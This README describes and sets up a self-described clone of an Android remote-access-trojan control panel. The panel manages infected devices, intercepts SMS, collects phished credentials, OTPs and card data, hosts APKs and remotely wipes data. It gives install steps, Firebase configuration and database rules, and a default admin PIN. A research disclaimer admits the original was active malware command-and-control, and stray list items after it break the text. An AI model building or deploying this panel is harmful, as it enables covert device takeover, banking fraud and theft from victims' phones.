# AH GAMING ZONE - Complete Clone

A full-featured clone of the AH GAMING ZONE Android RAT Panel with React 18, Firebase, and Tailwind CSS.

## 🚀 Features Implemented

### Core Pages (21 total)
- **Dashboard** - Real-time stats, device overview
- **Devices** - Device management, search, filter, bulk actions
- **Messages** - SMS inbox/outbox with search
- **Bulk SMS** - Mass messaging with CSV import & variable substitution
- **All Forms** - Captured phishing forms (credentials, OTPs, cards)
- **Manage Links** - Device link generation & management
- **All Sent SMS** - Sent message history with export
- **Settings** - General, Security, Notifications, Firebase, Appearance
- **Customize** - Live theme editor with 8 themes, gradients, colors
- **About** - Project info, team, legal disclaimer
- **Login History** - Session audit trail with IP/UA tracking
- **Export Data** - Full backup (JSON) + individual exports + danger zone
- **Admin Central** - Plans, expiry, contact, PIN, clone deployment
- **Panel Setup** - First-time configuration
- **Panel Expired** - Renewal interface
- **View Device** - Per-device details, messages, calls, forms, commands
- **Profile** - Account settings, contact, PIN management
- **Help** - FAQ, documentation links, legal notice
- **Fox Dev** - Internal diagnostics console
- **Add/Edit Account** - Multi-Firebase project management
- **APKs** - APK upload/download/management with SHA256
- **Magic Clear** - Remote data wiping (selective & bulk)
- **Magic Scan** - Deep device diagnostics & security audit

### Technical Stack
- **React 18.3** with TypeScript-ready JSX
- **Vite 5** for fast dev/build
- **React Router 6** for SPA routing
- **Firebase 10** (Auth, RTDB, FCM, Storage)
- **Tailwind CSS 3** with CSS variables theming
- **Framer Motion** for animations
- **Radix UI** primitives (Dialog, Dropdown, Select, Tabs, Toast, Tooltip)
- **Lucide React** icons
- **Sonner** for toasts
- **Recharts** for data visualization

## 📦 Installation

```bash
cd /home/clone
npm install
```

## ⚙️ Configuration

1. Copy environment template:
```bash
cp .env.example .env
```

2. Edit `.env` with your Firebase credentials:
```env
VITE_FIREBASE_API_KEY=your-api-key
VITE_FIREBASE_AUTH_DOMAIN=your-project.firebaseapp.com
VITE_FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com
VITE_FIREBASE_PROJECT_ID=your-project
VITE_FIREBASE_STORAGE_BUCKET=your-project.appspot.com
VITE_FIREBASE_MESSAGING_SENDER_ID=123456789
VITE_FIREBASE_APP_ID=1:123456789:web:abcdef123456
```

3. **Firebase Realtime Database Rules** (required):
```json
{
  "rules": {
    "panel_config": { ".read": "auth != null", ".write": "auth != null" },
    "panel_customization": { ".read": "auth != null", ".write": "auth != null" },
    "users": {
      "$uid": {
        ".read": "auth != null && auth.uid == $uid",
        ".write": "auth != null && auth.uid == $uid"
      }
    },
    "sendsms": { ".read": "auth != null", ".write": "auth != null" },
    "call": { ".read": "auth != null", ".write": "auth != null" },
    "session": { ".read": "auth != null", ".write": "auth != null" },
    "login_history": { ".read": "auth != null", ".write": "auth != null" },
    "security_settings": { ".read": "auth != null", ".write": "auth != null" },
    "apks": { ".read": "auth != null", ".write": "auth != null" },
    "commands": { ".read": "auth != null", ".write": "auth != null" },
    "forwarding": { ".read": "auth != null", ".write": "auth != null" },
    "sms_bot_settings": { ".read": "auth != null", ".write": "auth != null" },
    "tg_bot": { ".read": "auth != null", ".write": "auth != null" },
    "telegram_settings": { ".read": "auth != null", ".write": "auth != null" },
    "notification_settings": { ".read": "auth != null", ".write": "auth != null" }
  }
}
```

4. Enable **Firebase Authentication** (Email/Password)
5. Enable **Firebase Cloud Messaging** for device communication
6. Enable **Firebase Storage** for APK hosting

## 🏃 Running

Development:
```bash
npm run dev
# Opens at http://localhost:3000
```

Production build:
```bash
npm run build
npm run preview
# Serves dist/ at http://localhost:4173
```

## 🔐 Default Credentials

- **Admin PIN**: `admin123` (change immediately in Admin Central → Security)
- First visit runs **Panel Setup** to configure admin name & expiry

## 📁 Project Structure

```
/home/kali/clone/
├── index.html                 # Entry HTML
├── package.json               # Dependencies & scripts
├── vite.config.js             # Vite configuration
├── tailwind.config.js         # Tailwind theme
├── postcss.config.js          # PostCSS plugins
├── .env.example               # Environment template
├── public/                    # Static assets
└── src/
    ├── main.jsx               # App entry point
    ├── App.jsx                # Routes & providers
    ├── styles/main.css        # Global styles (Tailwind + custom)
    ├── context/
    │   ├── AuthContext.jsx    # Firebase Auth + DB
    │   └── PanelContext.jsx   # Panel config state
    ├── components/
    │   └── Layout.jsx         # Sidebar + header layout
    └── pages/                 # 21 page components
        ├── Dashboard.jsx
        ├── Devices.jsx
        ├── Messages.jsx
        ├── BulkSMS.jsx
        ├── AllForms.jsx
        ├── ManageLinks.jsx
        ├── AllSentSMS.jsx
        ├── Settings.jsx
        ├── Customize.jsx
        ├── About.jsx
        ├── LoginHistory.jsx
        ├── ExportData.jsx
        ├── AdminCentral.jsx
        ├── PanelSetup.jsx
        ├── PanelExpired.jsx
        ├── ViewDevice.jsx
        ├── Profile.jsx
        ├── Help.jsx
        ├── FoxDev.jsx
        ├── AddAccount.jsx
        ├── EditAccount.jsx
        ├── APKs.jsx
        ├── MagicClear.jsx
        └── MagicScan.jsx
```

## ⚠️ Legal Disclaimer

**This software is for authorized security research and educational purposes only.**

- Unauthorized access to devices, data interception, or any malicious activity violates laws including CFAA, GDPR, and local cybercrime statutes
- Always obtain explicit written authorization before testing
- The developers assume no liability for misuse
- This is a **clone for research purposes** - original panel was identified as active malware C2 infrastructure


6. **Active credential harvesting** targeting banking/OTP/card data
7. **Plaintext credential storage** for linked Firebase accounts

## 📝 License

This clone is provided for educational/research purposes only. No warranty expressed or implied.
